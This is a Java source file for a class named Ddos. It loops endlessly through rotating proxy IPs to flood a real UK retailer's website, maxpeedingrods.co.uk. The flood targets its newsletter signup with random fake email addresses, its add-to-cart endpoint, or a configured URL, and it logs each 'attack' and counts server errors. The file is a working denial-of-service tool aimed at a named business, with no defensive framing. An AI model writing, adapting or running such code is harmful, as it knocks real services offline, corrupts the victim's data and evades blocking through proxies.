package com.video.data.ddos;

import com.video.data.model.HttpModel;
import com.video.data.model.IpInfoModel;
import com.video.data.model.ProxyIp;
import com.video.data.utils.DdosUtil;
import com.video.data.utils.HttpRequest;
import com.video.data.utils.SpringUtil;
import com.video.data.utils.Utils;

import java.util.HashMap;
import java.util.Map;

public class Ddos implements Runnable {

    private String url;

    @Override
    public void run() {
        long loop = 1;
        while (true) {
            Map<String, String> header = new HashMap<>();
            System.out.println("线程" + Thread.currentThread().getName() + "第" + loop + "次攻击!");
            ProxyIp proxyIpModel = SpringUtil.getBean(ProxyIp.class);
            proxyIpModel.setTotalTimes(proxyIpModel.getTotalTimes() + 1);
            IpInfoModel ipInfo = DdosUtil.selectOneIp();
            if(ipInfo == null || "".equals(ipInfo.getIpInfo())) {
                System.out.println("暂无可用IP，休息十秒钟");
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException ignored) {}
                continue;
            }
            int code = request(header, ipInfo.getIpInfo()).getCode();
            if(code == 200) {
                DdosUtil.ipSuccess(ipInfo);
                proxyIpModel.setRequestTimes(proxyIpModel.getRequestTimes() + 1);
            }else if(code >= 500) {
                DdosUtil.ipSuccess(ipInfo);
                proxyIpModel.setRequestErrorTimes(proxyIpModel.getRequestErrorTimes() + 1);
            }
            if(code == 0) {
                DdosUtil.ipError(ipInfo);
                proxyIpModel.setIpErrorNumber(proxyIpModel.getIpErrorNumber() + 1);
            }
            loop++;
        }
    }

    private HttpModel request(Map<String, String > header, String proxyIp) {
        if(this.url.contains("post")) {
            String url = "https://www.maxpeedingrods.co.uk/index.php?route=extension/module/gg_newsletter/postSubscribe";
            Map<String, String> params = new HashMap<>();
            String email = Utils.generateRandomStr(10) + "@"
                    + Utils.generateRandomStr(5) + "."
                    + Utils.generateRandomStr(4);
            params.put("tm_newsletter_email", email);
            return HttpRequest.sendPostRequest(url, params, proxyIp);
        }else if(this.url.contains("cart")){
            String url = "https://www.maxpeedingrods.co.uk/index.php?route=checkout/cart/add";
            Map<String, String> params = new HashMap<>();
            params.put("product_id", "61041");
            return HttpRequest.sendPostRequest(url, params, proxyIp);
        }else{
            return HttpRequest.sendGetRequest(url, header, proxyIp);
        }
    }


    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }
}
